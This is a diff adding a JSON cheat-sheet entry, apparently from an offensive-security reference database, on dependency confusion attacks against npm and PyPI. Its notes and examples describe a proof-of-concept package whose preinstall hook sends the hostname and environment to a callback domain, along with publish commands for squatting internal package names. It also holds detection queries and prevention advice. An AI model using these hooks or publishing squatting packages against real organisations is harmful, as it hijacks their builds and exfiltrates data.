@@ -1,0 +1,107 @@
+{
+  "id": "web-dependency-confusion",
+  "name": "Dependency Confusion (Public-Registry Name Squatting)",
+  "command": "npm publish --registry https://registry.npmjs.org --access public",
+  "description": "Supply-chain attack where a package name used only by an organization's INTERNAL registry is also published to the PUBLIC registry (npm/PyPI/RubyGems/etc.) with a higher version number. Build tooling that queries both registries and picks the highest version then pulls the attacker's package, executing attacker code (install scripts) inside the victim's build/CI. Covers name discovery, higher-version squatting, and exfil via install hooks.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Web",
+  "subcategory": "Supply Chain",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "Alex Birsan - Dependency Confusion research",
+  "tags": [
+    "dependency-confusion",
+    "supply-chain",
+    "npm",
+    "pypi",
+    "typosquatting",
+    "ci-cd"
+  ],
+  "mitre": [
+    "T1195.001",
+    "T1195.002"
+  ],
+  "exam": "lab-only",
+  "notes": "=== WHY IT WORKS ===\n  Package managers often resolve a name across BOTH an internal/private registry and the public registry, then install the HIGHEST version available. If an internal-only name is unregistered publicly, an attacker publishes it publicly with a huge version (e.g. 99.0.0) and the build pulls it.\n\n=== FIND INTERNAL NAMES ===\n  - Leaked package.json / requirements.txt / *.csproj / build logs in public repos, JS bundles, error pages, Docker images.\n  - Internal scoped names without a reserved public scope (@company/foo where the @company scope is unclaimed on npm).\n\n=== NPM PoC PACKAGE ===\n  package.json:\n    { \"name\": \"internal-logger\", \"version\": \"99.0.0\", \"scripts\": { \"preinstall\": \"node exfil.js\" } }\n  exfil.js sends hostname/env/whoami to a collaborator URL (DNS/HTTP out of the build network).\n  npm publish --registry https://registry.npmjs.org --access public\n\n=== PYPI ===\n  - setup.py with code in setup() runs on install; publish with a higher version than the internal one.\n  - twine upload dist/*\n\n=== SAFE PoC ===\n  - Use ONLY a canary beacon (hostname + a unique token to a Burp Collaborator / interactsh domain). Do not exfil secrets or run destructive code; this is lab-only / authorized research.\n\n=== DEFENDER NOTE ===\n  This is a supply-chain primitive; the 'attack' happens inside the victim's build, so detection lives in CI egress + registry policy, not web logs.",
+  "examples": [
+    {
+      "label": "npm install-hook beacon in package.json",
+      "command": "\"scripts\": { \"preinstall\": \"node -e \\\"require('https').get('https://<token>.oast.site/'+require('os').hostname())\\\"\" }"
+    },
+    {
+      "label": "Publish the squatting package to public npm",
+      "command": "npm publish --registry https://registry.npmjs.org --access public"
+    },
+    {
+      "label": "PyPI upload of a higher-version squat",
+      "command": "python3 -m twine upload dist/internal_pkg-99.0.0.tar.gz"
+    }
+  ],
+  "references": [
+    {
+      "title": "Alex Birsan - Dependency Confusion",
+      "url": "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
+    },
+    {
+      "title": "OWASP - Vulnerable and Outdated Components / Supply Chain",
+      "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+    },
+    {
+      "title": "npm - Scopes and private packages",
+      "url": "https://docs.npmjs.com/cli/v10/using-npm/scope"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-pypi-supply-chain",
+      "note": "PyPI supply-chain abuse into a cloud build - same class in an AWS pipeline.",
+      "rel": "alternative"
+    },
+    {
+      "id": "aws-jenkins-pipeline-rce",
+      "note": "CI/CD pipeline RCE is the usual post-pull outcome.",
+      "rel": "next"
+    },
+    {
+      "id": "recon-trufflehog",
+      "note": "Secret/name discovery in public repos surfaces internal package names.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Package managers that query a public registry alongside a private one and select the highest semantic version will prefer an attacker's public package when an internal-only name is unclaimed publicly. Install-time scripts then execute in the build.",
+    "prerequisites": "An internal package name that is NOT reserved on the public registry, plus a build configuration that does not pin the registry/scope or lock hashes.",
+    "impact": "Arbitrary code execution inside CI/CD or developer machines, theft of build secrets and source, and a foothold for broader supply-chain compromise of shipped artifacts.",
+    "detection": "[MITRE T1195.001] CI build egress to package registries resolving internal names from the PUBLIC registry, install-script child processes spawning network/exec, and unexpected version jumps (e.g. 99.0.0) for internal packages.",
+    "artifacts": "CI/CD build logs (resolved registry URL and version per dependency), egress proxy logs from build runners, npm/pip audit output, and registry access logs showing public fetches of internal names.",
+    "splunk_spl": "index=proxy src_category=ci_runner (uri_host=\"registry.npmjs.org\" OR uri_host=\"pypi.org\")\n| rex field=uri_path \"/(?<pkg>[^/]+)\"\n| search pkg IN (internal_pkg_list)\n| stats count by src_ip, pkg, uri_host",
+    "elastic_kql": "destination.domain:(\"registry.npmjs.org\" or \"pypi.org\") and source.labels.role:\"ci-runner\" and url.path:*internal*",
+    "sentinel_kql": "CommonSecurityLog\n| where DeviceEventClassID == \"proxy\" and RequestURL has_any (\"registry.npmjs.org\",\"pypi.org\")\n| where SourceUserName == \"ci-runner\"\n| summarize count() by SourceIP, RequestURL",
+    "sigma_rules": "ci_dependency_confusion_public_fetch",
+    "prevention": "Reserve all internal package names/scopes on the public registries. Pin builds to the private registry only (scoped registry config, no public fallback), enforce lockfiles with integrity hashes, use .npmrc/pip index-url that forbids public resolution of internal names, and disable or sandbox install scripts (npm --ignore-scripts).",
+    "sources": [
+      "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610",
+      "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "CI runner fetching an internal package name from a public registry",
+        "logic": "index=proxy (uri_host=\"registry.npmjs.org\" OR uri_host=\"pypi.org\")\n| rex field=uri_path \"/(?<pkg>[a-zA-Z0-9@._-]+)\"\n| lookup internal_packages name AS pkg OUTPUT name AS is_internal\n| where isnotnull(is_internal)\n| stats count values(uri_path) by src_ip, pkg",
+        "data_source": "proxy",
+        "attack": [
+          "T1195.001",
+          "T1195.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "An internal name that is also a legitimate public package (verify ownership).",
+        "tuning": "Maintain a lookup of internal package names; alert only when a build runner resolves one against the public registry."
+      }
+    ]
+  }
+}
